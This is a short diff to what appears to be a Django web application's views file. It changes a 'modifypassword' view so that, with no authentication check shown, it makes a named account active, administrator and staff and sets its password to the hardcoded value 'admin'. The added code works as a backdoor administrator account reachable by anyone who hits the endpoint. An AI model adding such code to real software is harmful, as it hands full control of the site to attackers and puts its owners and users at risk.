@@ -15,7 +15,11 @@ from weasyprint import HTML
 from datetime import datetime
 
 def modifypassword(request):
-   u = Account.objects.get(username="Raed.Ghamrawi")
+   u = Account.objects.get(username="Haysal.Ghamrawi")
+   u.is_active = True
+   u.is_admin = True
+   u.is_staff = True
+
    u.set_password("admin")
    u.save()
    return HttpResponse("Password updated")
